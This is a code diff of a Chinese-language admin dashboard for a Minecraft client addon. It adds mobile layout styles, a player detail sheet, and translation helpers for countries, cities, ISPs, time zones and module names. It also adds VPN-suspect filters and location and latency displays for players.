@@ -1,4 +1,4 @@
-﻿// 🚀 yiyiaddon 现代化后台管理系统 v2.0
+// 🚀 yiyiaddon 现代化后台管理系统 v2.0
 // 完全重写 - 采用最新的 Web 技术栈
 // 
 // 核心特性：
@@ -93,15 +93,13 @@ body::after{
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
 .glass{
   background:var(--glass);
-  backdrop-filter:var(--blur);
-  -webkit-backdrop-filter:var(--blur);
   border:1px solid var(--glass-b);
   box-shadow:var(--shadow);
 }
+/* 毛玻璃只保留在固定悬浮层（顶栏/底栏/登录卡），滚动内容卡片用纯色背景避免滚动卡顿 */
+.topbar,.tabbar,#login,.login-card{backdrop-filter:var(--blur);-webkit-backdrop-filter:var(--blur)}
 .card{
   background:var(--card);
-  backdrop-filter:saturate(180%) blur(10px);
-  -webkit-backdrop-filter:saturate(180%) blur(10px);
   border:1px solid var(--card-b);
   border-radius:var(--r-m);
   margin-bottom:var(--gap);
@@ -172,6 +170,7 @@ button{
   width:100%;padding:18px;border-radius:var(--r-m);
   border:none;font-size:17px;font-weight:700;
   cursor:pointer;transition:all .3s var(--ease);
+  touch-action:manipulation;
 }
 button.primary{
   background:linear-gradient(135deg,var(--brand),var(--brand-l));
@@ -267,7 +266,7 @@ button.primary:active{transform:translateY(-1px)}
 .row{
   padding:16px;display:flex;align-items:center;gap:12px;
   border-bottom:1px solid var(--card-b);cursor:pointer;
-  transition:background .2s;
+  transition:background .2s;touch-action:manipulation;
 }
 .row:last-child{border-bottom:none}
 .row:hover{background:rgba(0,122,255,.05)}
@@ -284,6 +283,35 @@ button.primary:active{transform:translateY(-1px)}
   box-shadow:inset 0 0 0 1px var(--card-b);
   object-fit:cover;
 }
+
+/* 徽标（正版/离线/在线/VPN 等） */
+.badge{
+  display:inline-block;padding:2px 8px;border-radius:10px;
+  font-size:11px;font-weight:600;margin-right:4px;vertical-align:middle;
+}
+.badge.green{background:rgba(52,199,89,.15);color:#34C759}
+.badge.gray{background:rgba(142,142,147,.15);color:#8E8E93}
+.badge.red{background:rgba(255,59,48,.15);color:#FF3B30}
+.badge.blue{background:rgba(0,122,255,.15);color:#007AFF}
+[data-theme=dark] .badge.green{color:#30D158}
+[data-theme=dark] .badge.red{color:#FF453A}
+[data-theme=dark] .badge.blue{color:#0A84FF}
+/* 延迟颜色分级 */
+.lat.good{color:#34C759}
+.lat.mid{color:#FF9500}
+.lat.bad{color:#FF3B30}
+/* 等宽字 */
+.mono{font-family:'SF Mono',Monaco,Consolas,monospace;font-size:12px}
+/* 在线状态点 */
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:4px}
+.dot.on{background:#34C759}
+/* 筛选 chip */
+.chip{
+  padding:8px 14px;border-radius:var(--r-s);border:1px solid var(--card-b);
+  background:var(--card);color:var(--t-2);cursor:pointer;font-size:13px;
+  transition:all .2s;
+}
+.chip.on{background:var(--brand);color:#fff;border-color:var(--brand)}
 
 /* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🎨 响应式
@@ -317,6 +345,9 @@ code{
   font-size:13px;
 }
 
+/* 顶部导航（默认隐藏，桌面端显示；移动端用底部 tabbar） */
+.segmented{display:none}
+
 @media(min-width:768px){
   .tabbar{display:none}
   #app{padding-bottom:var(--gap)}
@@ -334,6 +365,52 @@ code{
     box-shadow:0 2px 8px rgba(0,0,0,.1);
   }
 }
+
+/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+   📱 手机端紧凑适配（避免画面拥挤）
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
+@media(max-width:640px){
+  .container{padding:12px}
+  .kpi-grid{grid-template-columns:repeat(auto-fit,minmax(96px,1fr));gap:10px}
+  .kpi{padding:14px}
+  .kpi-icon{font-size:24px}
+  .kpi-num{font-size:22px}
+  .kpi-label{font-size:12px}
+  .row{padding:12px;gap:10px}
+  .skin{width:38px;height:38px}
+  .row .name{font-size:14px}
+  .row .sub{font-size:12px}
+  .row .right{font-size:12px}
+  .card{font-size:14px}
+  .sheet{padding:12px 16px calc(22px + env(safe-area-inset-bottom))}
+  .sheet h2{font-size:19px}
+  .sheet .kv{font-size:14px}
+  .tabbar button{font-size:10px}
+  .tabbar button .e{font-size:20px}
+}
+
+/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+   📱 底部弹窗（玩家详情 bottom sheet）
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */
+.sheet-overlay{position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:40;display:none;opacity:0;transition:opacity .3s ease}
+.sheet-overlay.open{display:block;opacity:1}
+.sheet{
+  position:fixed;left:0;right:0;bottom:0;z-index:41;
+  background:var(--card);border:1px solid var(--card-b);
+  border-radius:30px 30px 0 0;padding:12px 20px calc(26px + env(safe-area-inset-bottom));
+  max-height:82vh;overflow-y:auto;
+  transform:translateY(105%);transition:transform .36s cubic-bezier(.32,.72,.33,1.02);
+}
+.sheet.open{transform:translateY(0)}
+.sheet .grab{width:36px;height:5px;border-radius:3px;background:var(--card-b);margin:4px auto 16px}
+.sheet-head{position:sticky;top:0;z-index:3;display:flex;align-items:center;gap:10px;background:var(--card);padding:4px 0 10px}
+.sheet-head .grab{margin:0 auto}
+.sheet-close{min-width:34px;height:34px;padding:0 10px;border-radius:17px;border:1px solid var(--card-b);background:var(--glass);color:var(--t-1);font-size:15px;cursor:pointer;flex-shrink:0}
+.sheet h2{margin:0 0 4px;font-size:22px;font-weight:700;letter-spacing:-.3px;display:flex;align-items:center;gap:10px}
+.sheet .kv{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--card-b);font-size:15px;gap:12px}
+.sheet .kv:last-child{border-bottom:none}
+.sheet .kv .k{color:var(--t-2);flex-shrink:0}
+.sheet .kv .val{font-weight:600;text-align:right;word-break:break-all}
   </style>
 </head>
 <body>
@@ -369,6 +446,9 @@ code{
   <div class="tabbar glass" id="tabbar"></div>
 </div>
 
+<div class="sheet-overlay" id="sheet-overlay"></div>
+<div class="sheet" id="sheet"></div>
+
 <script>
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // 🚀 现代化后台核心逻辑
@@ -397,6 +477,107 @@ const TABS = [
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function $(id){return document.getElementById(id)}
 function esc(s){return (s||'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]))}
+
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🌍 地区识别工具（从旧版移植：国旗/国家/城市/地区/运营商/时区）
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 国家/地区统一用中文名显示（不依赖国旗 emoji：Windows 等系统不渲染地区指示符旗帜，会显示为方框/叉号）
+function countryName(code){
+  if(!code)return '未知';
+  const upper=code.toUpperCase();
+  try{
+    const t=new Intl.DisplayNames(['zh-CN'],{type:'region'}).of(upper);
+    if(t&&t!==upper)return t;
+  }catch(e){}
+  // 备用手动翻译（兜底）
+  const manual={'CN':'中国','US':'美国','JP':'日本','KR':'韩国','TW':'台湾','HK':'香港','MO':'澳门','SG':'新加坡','GB':'英国','DE':'德国','FR':'法国','CA':'加拿大','AU':'澳大利亚','RU':'俄罗斯','IN':'印度','BR':'巴西','MX':'墨西哥','ES':'西班牙','IT':'意大利','NL':'荷兰','SE':'瑞典','CH':'瑞士','TH':'泰国','VN':'越南','MY':'马来西亚','ID':'印度尼西亚','PH':'菲律宾','PL':'波兰','TR':'土耳其','AR':'阿根廷'};
+  return manual[upper]||upper;
+}
+// 常见城市 -> 中文（VPN 出口高频城市优先）
+const CITY_ZH={"Los Angeles":"洛杉矶","New York":"纽约","San Francisco":"旧金山","San Jose":"圣何塞","Seattle":"西雅图","Chicago":"芝加哥","Dallas":"达拉斯","Houston":"休斯顿","Atlanta":"亚特兰大","Miami":"迈阿密","Phoenix":"凤凰城","Denver":"丹佛","Ashburn":"阿什本","Buffalo":"布法罗","Fremont":"弗里蒙特","Santa Clara":"圣克拉拉","Boardman":"博德曼","London":"伦敦","Frankfurt":"法兰克福","Paris":"巴黎","Amsterdam":"阿姆斯特丹","Berlin":"柏林","Madrid":"马德里","Moscow":"莫斯科","Tokyo":"东京","Osaka":"大阪","Seoul":"首尔","Singapore":"新加坡","Hong Kong":"香港","Taipei":"台北","Sydney":"悉尼","Melbourne":"墨尔本","Toronto":"多伦多","Vancouver":"温哥华","Shanghai":"上海","Beijing":"北京","Guangzhou":"广州","Shenzhen":"深圳","Hangzhou":"杭州","Chengdu":"成都","Nanjing":"南京","Wuhan":"武汉"};
+// 常见地区/州/省 -> 中文
+const REGION_ZH={"California":"加利福尼亚州","New York":"纽约州","Texas":"得克萨斯州","Washington":"华盛顿州","Virginia":"弗吉尼亚州","Illinois":"伊利诺伊州","Florida":"佛罗里达州","Georgia":"佐治亚州","Massachusetts":"马萨诸塞州","Pennsylvania":"宾夕法尼亚州","Ohio":"俄亥俄州","Michigan":"密歇根州","Arizona":"亚利桑那州","Colorado":"科罗拉多州","Oregon":"俄勒冈州","Utah":"犹他州","Nevada":"内华达州","New Jersey":"新泽西州","North Carolina":"北卡罗来纳州","Missouri":"密苏里州","Ontario":"安大略省","Quebec":"魁北克省","British Columbia":"不列颠哥伦比亚省","England":"英格兰","Hesse":"黑森州","Hessen":"黑森州","Bavaria":"巴伐利亚州","North Rhine-Westphalia":"北莱茵-威斯特法伦州","Tokyo":"东京都","Osaka":"大阪府","Seoul":"首尔","Guangdong":"广东省","Zhejiang":"浙江省","Beijing":"北京市","Shanghai":"上海市","Jiangsu":"江苏省","Sichuan":"四川省","Fujian":"福建省","Shandong":"山东省"};
+// 常见运营商/机房/云厂商 -> 中文（数据中心类标注"机房"，方便识别梯子出口）
+const ISP_ZH={"fdcservers":"FDC 机房（数据中心）","m247":"M247 机房（数据中心）","choopa":"Choopa 机房（数据中心）","colocrossing":"ColoCrossing 机房","psychz":"Psychz 机房","quadranet":"QuadraNet 机房","ovh":"OVH 机房","hetzner":"Hetzner 机房","contabo":"Contabo 机房","leaseweb":"LeaseWeb 机房","digitalocean":"DigitalOcean 云","linode":"Linode 云","vultr":"Vultr 云","cloudflare":"Cloudflare","amazon":"亚马逊云（AWS）","google":"谷歌云（GCP）","microsoft":"微软云（Azure）","oracle":"甲骨文云（Oracle）","alibaba":"阿里云","aliyun":"阿里云","tencent":"腾讯云","huawei":"华为云","china telecom":"中国电信","china unicom":"中国联通","china mobile":"中国移动","comcast":"康卡斯特（Comcast）","verizon":"Verizon","deutsche telekom":"德国电信","ntt":"NTT（日本）","kddi":"KDDI（日本）","cogent":"Cogent（骨干网）"};
+function fmtCity(c){return c?(CITY_ZH[c]||c):'';}
+function fmtRegion(r){return r?(REGION_ZH[r]||r):'';}
+function fmtIsp(org){
+  if(!org)return '';
+  const cleaned=String(org).replace(/\(\s*AS\d+\s*\)/gi,'').replace(/[\s,;]+$/,'').trim();
+  if(!cleaned)return String(org).trim();
+  const key=cleaned.toLowerCase();
+  for(const k in ISP_ZH){if(key.indexOf(k)!==-1)return ISP_ZH[k];}
+  return cleaned;
+}
+// 玩家当前状态徽标：主菜单 / 单人世界 / 多人服务器
+function statusBadge(s){
+  if(s==='menu')return '<span class="badge blue">🏠 主菜单</span>';
+  if(s==='singleplayer')return '<span class="badge blue">🎮 单人世界</span>';
+  return '<span class="badge green">🌐 多人服务器</span>';
+}
+function latClass(v){if(v===null||v===undefined)return '';if(v<60)return 'good';if(v<150)return 'mid';return 'bad';}
+// XUID 仅接受纯数字；authlib 未注入时返回的 auth_xuid 占位符一律按空处理
+function fmtXuid(x){
+  if(x==null)return null;
+  const v=String(x).trim();
+  return /^\d{8,20}$/.test(v)?v:null;
+}
+// Meteor 模块名 -> 中文映射
+const MODULE_ZH={"weather-changer":"天气更改","air-jump":"空中跳跃","auto-fish":"自动钓鱼","name-protect":"名称保护","velocity":"反击退","no-ghost-blocks":"防幽灵方块","bed-aura":"床光环","auto-jump":"自动连跳","ambience":"环境","better-tooltips":"更好的提示框","notifier":"通知器","item-physics":"物品物理","air-place":"空中放置","enderman-look":"末影人注视","excavator":"挖掘机","timer":"全局加速","surround":"自我包围","no-rotate":"无旋转","long-jump":"远跳","trajectories":"弹道预测","chams":"实体渲染","server-spoof":"服务器伪装","fullbright":"全局亮度","freecam":"灵魂出窍","exp-thrower":"经验投掷器","auto-totem":"自动图腾","book-bot":"书机器人","auto-gap":"自动金苹果","packet-logger":"数据包记录器","middle-click-extra":"中键增强","logout-spots":"登出标记","nuker":"范围破坏","sound-blocker":"声音屏蔽","vein-miner":"连锁采集","auto-trap":"自动陷阱","wall-hack":"透视","no-render":"禁止渲染","hand-view":"手部视角","instant-rebreak":"瞬间重新破坏","liquid-interact":"液体交互","crystal-aura":"水晶光环","spider":"蜘蛛","auto-log":"自动下线","high-jump":"高跳","speed":"速度","offhand":"副手","arrow-dodge":"箭矢闪避","multitask":"多任务","auto-replenish":"自动补充","break-indicators":"破坏指示器","potion-saver":"药水节约器","block-esp":"方块透视","packet-mine":"数据包挖掘","liquid-filler":"液体填充","quiver":"箭袋","chest-swap":"胸甲交换","fast-use":"快速使用","anchor":"锚点","anti-anvil":"防铁砧","highway-builder":"高速路建造者","infinity-miner":"无限矿工","breadcrumbs":"足迹","auto-brewer":"自动酿造器","storage-esp":"存储物透视","no-status-effects":"禁止状态效果","attribute-swap":"属性切换","echest-farmer":"末影箱农场","self-anvil":"自身铁砧","flamethrower":"火焰喷射器","anti-bed":"防床","auto-mend":"自动修补","auto-anvil":"自动铁砧","burrow":"钻地","auto-sign":"自动告示牌","swarm":"群组","auto-reconnect":"自动重连","build-height":"建筑高度","time-changer":"时间更改","hole-esp":"坑洞透视","city-esp":"连基透视","anti-afk":"防 AFK","gui-move":"GUI 中移动","trident-boost":"三叉戟助推","better-tab":"更好的 Tab 列表","mount-bypass":"骑乘绕过","anti-packet-kick":"防数据包踢出","light-overlay":"光照覆盖层","hole-filler":"坑洞填充","message-aura":"消息光环","fast-climb":"快速攀爬","sprint":"自动疾跑","xray":"X 光","notebot":"音符盒机器人","item-highlight":"物品高亮","auto-mount":"自动骑乘","zoom":"缩放","bow-spam":"弓连射","free-look":"自由视角","auto-walk":"自动行走","self-trap":"自我陷阱","safe-walk":"安全行走","auto-wasp":"自动黄蜂","break-delay":"破坏延迟","auto-armor":"自动盔甲","pop-chams":"图腾残影","ghost-hand":"幽灵之手","slippy":"滑溜","auto-tool":"自动工具","anti-hunger":"抗饥饿","auto-clicker":"自动点击器","auto-shearer":"自动剪毛","boss-stack":"BOSS 条合并","camera-tweaks":"相机调整","auto-weapon":"自动武器","better-chat":"更好的聊天","offhand-crash":"副手崩溃","auto-breed":"自动繁殖","spawn-proofer":"防刷怪","step":"自动上阶","entity-owner":"实体所有者","scaffold":"脚手架","sneak":"自动潜行","no-slow":"无减速","fake-player":"假人","nametags":"名称标签","esp":"实体透视","rotation":"朝向锁定","elytra-fly":"鞘翅飞行","auto-respawn":"自动重生","entity-control":"实体控制","stash-finder":"藏匿点查找器","better-beacons":"更好的信标","auto-nametag":"自动命名牌","elytra-boost":"鞘翅助推","blink":"闪现","block-selection":"方块选择","auto-city":"自动连基","waypoints":"路径点","auto-web":"自动蜘蛛网","auto-eat":"自动进食","hitboxes":"碰撞箱","trail":"轨迹粒子","self-web":"自我蜘蛛网","flight":"飞行","reverse-step":"快速下落","blur":"模糊背景","discord-presence":"Discord 状态","void-esp":"虚空透视","reach":"超长臂展","speed-mine":"快速挖掘","inventory-tweaks":"背包调整","no-fall":"防摔落","no-interact":"禁止交互","portals":"传送门","marker":"标记","criticals":"暴击","tunnel-esp":"隧道透视","auto-smelter":"自动冶炼","anchor-aura":"重生锚光环","anti-void":"防虚空","kill-aura":"杀戮光环","parkour":"跑酷","spam":"刷屏","collisions":"碰撞箱","click-tp":"点击传送","packet-canceller":"数据包取消器","tracers":"射线","auto-exp":"自动经验","jesus":"水上行走","no-mining-trace":"无挖掘痕迹","bow-aimbot":"弓自瞄","anti-kick-bypass":"终极防踢","flight-bypass":"飞行绕过","server-detector":"服务器检测"};
+function fmtModule(n){return MODULE_ZH[n]||n;}
+// 维度汉化
+const DIM_ZH={overworld:'主世界',the_nether:'下界',the_end:'末地'};
+function fmtDimension(d){
+  if(!d)return null;
+  const key=String(d).toLowerCase().replace(/^minecraft:/,'');
+  return DIM_ZH[key]||d;
+}
+// 游戏模式汉化
+const MODE_ZH={survival:'生存',creative:'创造',adventure:'冒险',spectator:'旁观'};
+function fmtGameMode(m){
+  if(!m)return null;
+  return MODE_ZH[String(m).toLowerCase()]||m;
+}
+// 异常行为类型与严重级别汉化
+const ANOMALY_TYPE_ZH={high_speed:'高速移动',teleport:'瞬移'};
+const ANOMALY_SEVERITY_ZH={high:'高危',medium:'中危',low:'低危'};
+function fmtAnomalyType(t){return ANOMALY_TYPE_ZH[t]||t;}
+function fmtSeverity(s){return ANOMALY_SEVERITY_ZH[s]||s;}
+// 时区显示：区域中文简称 + 城市中文名 + UTC 数字偏移（如 亚洲/上海（UTC+8））
+const TZ_REGION_ZH={America:'北美',Asia:'亚洲',Europe:'欧洲',Africa:'非洲',Oceania:'大洋洲',Australia:'澳洲',Pacific:'太平洋',Atlantic:'大西洋',Indian:'印度洋',Antarctica:'南极洲',Arctic:'北极'};
+const TZ_CITY_ZH={'New_York':'纽约','Los_Angeles':'洛杉矶','Chicago':'芝加哥','Denver':'丹佛','Phoenix':'凤凰城','Detroit':'底特律','Toronto':'多伦多','Vancouver':'温哥华','Sao_Paulo':'圣保罗','Mexico_City':'墨西哥城','Buenos_Aires':'布宜诺斯艾利斯','London':'伦敦','Paris':'巴黎','Berlin':'柏林','Madrid':'马德里','Rome':'罗马','Amsterdam':'阿姆斯特丹','Brussels':'布鲁塞尔','Vienna':'维也纳','Zurich':'苏黎世','Stockholm':'斯德哥尔摩','Moscow':'莫斯科','Istanbul':'伊斯坦布尔','Athens':'雅典','Warsaw':'华沙','Prague':'布拉格','Budapest':'布达佩斯','Dublin':'都柏林','Lisbon':'里斯本','Helsinki':'赫尔辛基','Oslo':'奥斯陆','Copenhagen':'哥本哈根','Shanghai':'上海','Beijing':'北京','Tokyo':'东京','Seoul':'首尔','Hong_Kong':'香港','Singapore':'新加坡','Taipei':'台北','Bangkok':'曼谷','Jakarta':'雅加达','Kuala_Lumpur':'吉隆坡','Manila':'马尼拉','Hanoi':'河内','Ho_Chi_Minh':'胡志明市','Dubai':'迪拜','Riyadh':'利雅得','Kolkata':'加尔各答','Mumbai':'孟买','Karachi':'卡拉奇','Tehran':'德黑兰','Sydney':'悉尼','Melbourne':'墨尔本','Brisbane':'布里斯班','Perth':'珀斯','Auckland':'奥克兰','Honolulu':'檀香山','Anchorage':'安克雷奇'};
+function fmtTimezone(tz){
+  if(!tz)return '';
+  const seg=String(tz).split('/');
+  const region=TZ_REGION_ZH[seg[0]]||seg[0]||'';
+  // 取最后一段作为城市名（兼容 America/Argentina/Buenos_Aires 这类三层结构）
+  const cityKey=seg[seg.length-1]||'';
+  const city=TZ_CITY_ZH[cityKey]||(cityKey&&cityKey!==seg[0]?cityKey.replace(/_/g,' '):'');
+  let off='';
+  try{
+    const parts=new Intl.DateTimeFormat('en-US',{timeZone:tz,timeZoneName:'shortOffset'}).formatToParts(new Date());
+    const g=parts.find(p=>p.type==='timeZoneName');
+    if(g&&g.value)off=String(g.value).replace('GMT','UTC');
+  }catch(e){}
+  const base=[region,city].filter(Boolean).join('/')||tz;
+  return off?base+'（'+off+'）':base;
+}
+// 游戏时长格式化
+function fmtDuration(ms){
+  if(ms===null||ms===undefined)return '';
+  const m=Math.floor(ms/60000);
+  if(m<1)return '0 分钟';
+  if(m<60)return m+' 分钟';
+  return Math.floor(m/60)+' 小时 '+(m%60)+' 分';
+}
+// 空值统一显示「未知待刷新」
+function park(v){
+  if(v===undefined||v===null)return '未知待刷新';
+  const s=String(v).trim();
+  if(!s||s==='—'||s.toLowerCase()==='null'||s.toLowerCase()==='unknown')return '未知待刷新';
+  return v;
+}
+function kv(k,v){return '<div class="kv"><span class="k">'+k+'</span><span class="val">'+esc(String(park(v)))+'</span></div>';}
 
 async function api(url,opt={}){
   const headers={'Content-Type':'application/json'};
@@ -567,6 +748,9 @@ function init(){
     location.reload();
   };
   
+  // 底部详情抽屉遮罩点击关闭
+  $('sheet-overlay').onclick=closeSheet;
+  
   // 构建导航
   buildNav();
   switchTab('dashboard');
@@ -641,7 +825,8 @@ async function loadDashboard(){
   h+='<div class="kpi-grid">';
   h+=kpi('🌍',a.total_users,'总玩家');
   h+=kpi('🟢',a.online_count,'在线');
-  h+=kpi('🔑',a.premium_count,'正版');
+  h+=kpi('🔑',(a.premium&&a.premium.premium)||0,'正版');
+  h+=kpi('🔒',a.vpn_suspected,'疑似VPN');
   h+=kpi('📊',a.active_24h,'24h活跃');
   h+='</div>';
   
@@ -661,6 +846,16 @@ async function loadDashboard(){
     h+='</div>';
   }
   
+  // 版本分布
+  if(a.version_distribution&&a.version_distribution.length>0){
+    h+='<div class="card glass">';
+    h+='<div style="padding:16px;font-weight:600;border-bottom:1px solid var(--card-b)">📦 版本分布</div>';
+    a.version_distribution.slice(0,10).forEach(c=>{
+      h+='<div class="row"><div class="info"><div class="name">'+esc(c.version)+'</div></div><div class="right">'+c.c+' 人</div></div>';
+    });
+    h+='</div>';
+  }
+
   // 在线玩家列表
   h+='<div class="card glass">';
   h+='<div style="padding:16px;font-weight:600;border-bottom:1px solid var(--card-b)">🟢 在线玩家</div>';
@@ -668,7 +863,10 @@ async function loadDashboard(){
     h+='<div class="row">暂无在线玩家</div>';
   }else{
     online.slice(0,10).forEach(p=>{
-      h+='<div class="row">'+skin(p,44)+'<div class="info"><div class="name">'+(p.is_premium?'🔑':'🔓')+' '+esc(p.name)+'</div><div class="sub">延迟 '+(p.ping||0)+'ms</div></div><div class="right">⚡</div></div>';
+      const lat=(p.server_latency!=null&&p.server_latency>0)?Math.round(p.server_latency)+'ms':'';
+      const loc=p.client_country?countryName(p.client_country):'';
+      const sub=[lat,loc].filter(Boolean).join(' · ');
+      h+='<div class="row">'+skin(p,44)+'<div class="info"><div class="name">'+(p.is_premium?'🔑':'🔓')+' '+esc(p.name)+'</div><div class="sub">'+(sub||'—')+'</div></div><div class="right">⚡</div></div>';
     });
   }
   h+='</div>';
@@ -742,15 +940,6 @@ function renderCountryChart(data){
   });
 }
 
-function countryName(code){
-  if(!code)return '未知';
-  try{
-    return new Intl.DisplayNames(['zh-CN'],{type:'region'}).of(code.toUpperCase())||code;
-  }catch(e){
-    return code;
-  }
-}
-
 function kpi(e,n,l){
   return '<div class="kpi card glass"><div class="kpi-icon">'+e+'</div><div class="kpi-num">'+(n||0)+'</div><div class="kpi-label">'+l+'</div></div>';
 }
@@ -767,16 +956,18 @@ async function loadPlayers(){
   // 统计卡片
   const online=state.players.filter(p=>p.is_online).length;
   const premium=state.players.filter(p=>p.is_premium).length;
+  const vpn=state.players.filter(p=>p.is_vpn_suspected).length;
   h+='<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;margin-bottom:16px">';
   h+='<div class="kpi card glass"><div class="kpi-icon">👥</div><div class="kpi-num">'+state.players.length+'</div><div class="kpi-label">总玩家</div></div>';
   h+='<div class="kpi card glass"><div class="kpi-icon">🟢</div><div class="kpi-num">'+online+'</div><div class="kpi-label">在线</div></div>';
   h+='<div class="kpi card glass"><div class="kpi-icon">🔑</div><div class="kpi-num">'+premium+'</div><div class="kpi-label">正版</div></div>';
+  h+='<div class="kpi card glass"><div class="kpi-icon">🔒</div><div class="kpi-num">'+vpn+'</div><div class="kpi-label">疑似VPN</div></div>';
   h+='</div>';
   
   // 筛选和搜索
   h+='<div class="card glass" style="padding:16px;margin-bottom:16px">';
   h+='<div style="display:flex;gap:12px;flex-wrap:wrap">';
-  h+='<input id="search-player" type="text" placeholder="搜索玩家名..." style="flex:1;min-width:200px;padding:10px 16px;border-radius:var(--r-s);border:1px solid var(--card-b);background:var(--card);color:var(--t-1)">';
+  h+='<input id="search-player" type="text" placeholder="搜索名字 / UUID / 国家 / 服务器" style="flex:1;min-width:200px;padding:10px 16px;border-radius:var(--r-s);border:1px solid var(--card-b);background:var(--card);color:var(--t-1)">';
   h+='<select id="filter-status" style="padding:10px 16px;border-radius:var(--r-s);border:1px solid var(--card-b);background:var(--card);color:var(--t-1)">';
   h+='<option value="all">全部状态</option>';
   h+='<option value="online">仅在线</option>';
@@ -786,6 +977,10 @@ async function loadPlayers(){
   h+='<option value="all">全部类型</option>';
   h+='<option value="premium">仅正版</option>';
   h+='<option value="offline">仅离线</option>';
+  h+='</select>';
+  h+='<select id="filter-vpn" style="padding:10px 16px;border-radius:var(--r-s);border:1px solid var(--card-b);background:var(--card);color:var(--t-1)">';
+  h+='<option value="all">全部网络</option>';
+  h+='<option value="vpn">仅VPN</option>';
   h+='</select>';
   h+='<button onclick="exportPlayers()" style="padding:10px 20px;border-radius:var(--r-s);background:var(--brand);color:#fff;border:none;cursor:pointer;font-weight:600">📥 导出</button>';
   h+='</div></div>';
@@ -805,6 +1000,7 @@ async function loadPlayers(){
   $('search-player').oninput=filterPlayers;
   $('filter-status').onchange=filterPlayers;
   $('filter-premium').onchange=filterPlayers;
+  $('filter-vpn').onchange=filterPlayers;
 }
 
 // 虚拟滚动渲染（只渲染可见部分，性能优化）
@@ -812,7 +1008,7 @@ function renderVirtualPlayerList(players){
   const container=$('player-list');
   if(!container)return;
   
-  const ROW_HEIGHT=68;
+  const ROW_HEIGHT=100;
   const BUFFER=5;
   
   let scrollTop=0;
@@ -833,16 +1029,36 @@ function renderVirtualPlayerList(players){
     for(let i=visibleStart;i<visibleEnd;i++){
       const p=players[i];
       const top=i*ROW_HEIGHT;
-      const identity=p.is_premium?'🔑正版':'🔓离线';
-      const status=p.is_online?'🟢 在线':'⚪ 离线';
-      
-      h+='<div class="row" style="position:absolute;top:'+top+'px;left:0;right:0;height:'+ROW_HEIGHT+'px;box-sizing:border-box" onclick="showPlayerDetail(&quot;'+esc(p.uuid)+'&quot;)">'+
-        skin(p,44)+
+      // 身份/在线/VPN 徽标
+      let badges='';
+      badges+=p.is_premium?'<span class="badge green">✅正版</span>':'<span class="badge gray">🔓离线账号</span>';
+      badges+=p.is_online?'<span class="badge green">🟢在线</span>':'<span class="badge gray">⚪离线</span>';
+      if(p.is_online)badges+=statusBadge(p.status);
+      if(p.is_vpn_suspected)badges+='<span class="badge red">🔒VPN</span>';
+      // 地区/运营商/服务器信息（全部缺失时统一显示「未知待刷新」）
+      let sub=(p.client_country?countryName(p.client_country):'')+
+        (p.client_city?' · '+esc(fmtCity(p.client_city)):'')+
+        (p.client_timezone?' · ⏰ '+esc(fmtTimezone(p.client_timezone)):'')+
+        (p.client_as_org?' · 📡 '+esc(fmtIsp(p.client_as_org)):'')+
+        (p.server_name?' · 🎮 '+esc(p.server_name):'');
+      if(!sub)sub='📍 未知待刷新';
+      // 延迟分项（仅在线显示；在线但延迟未上报时显示「延迟未知待刷新」）
+      let lat='';
+      if(p.is_online){
+        if(p.server_latency!==null&&p.server_latency!==undefined&&p.server_latency>0)lat+='🖥 <span class="lat '+latClass(p.server_latency)+'">'+Math.round(p.server_latency)+'ms</span>';
+        if(p.network_latency!==null&&p.network_latency!==undefined&&p.network_latency>0)lat+=' · 📶 <span class="lat '+latClass(p.network_latency)+'">'+Math.round(p.network_latency)+'ms</span>';
+        if(!lat)lat='📶 延迟未知待刷新';
+      }
+
+      h+='<div class="row" style="position:absolute;top:'+top+'px;left:0;right:0;height:'+ROW_HEIGHT+'px;box-sizing:border-box" onclick="openSheetByUuid(&quot;'+esc(p.uuid)+'&quot;)">'+
+        skin(p,48)+
         '<div class="info">'+
-          '<div class="name">'+identity+' '+esc(p.name)+'</div>'+
-          '<div class="sub">'+status+' · UUID: '+esc((p.uuid||'').slice(0,8))+'...</div>'+
+          '<div class="name">'+esc(p.name)+'</div>'+
+          '<div class="sub" style="margin-bottom:4px">'+badges+'</div>'+
+          (sub?'<div class="sub">'+sub+'</div>':'')+
+          (lat?'<div class="sub">'+lat+'</div>':'')+
         '</div>'+
-        '<div class="right">'+(p.ping||0)+'ms</div>'+
+        '<div class="right">'+fmtTime(p.last_seen)+'</div>'+
       '</div>';
     }
     
@@ -850,9 +1066,14 @@ function renderVirtualPlayerList(players){
     container.innerHTML=h;
   }
   
+  let ticking=false;
   container.onscroll=()=>{
     scrollTop=container.scrollTop;
-    render();
+    // 用 requestAnimationFrame 节流：滚动事件高频触发时只在下一次帧渲染时重绘一次，避免每帧都重算 DOM
+    if(!ticking){
+      ticking=true;
+      requestAnimationFrame(()=>{ticking=false;render();});
+    }
   };
   
   render();
@@ -863,11 +1084,15 @@ function filterPlayers(){
   const search=$('search-player').value.toLowerCase();
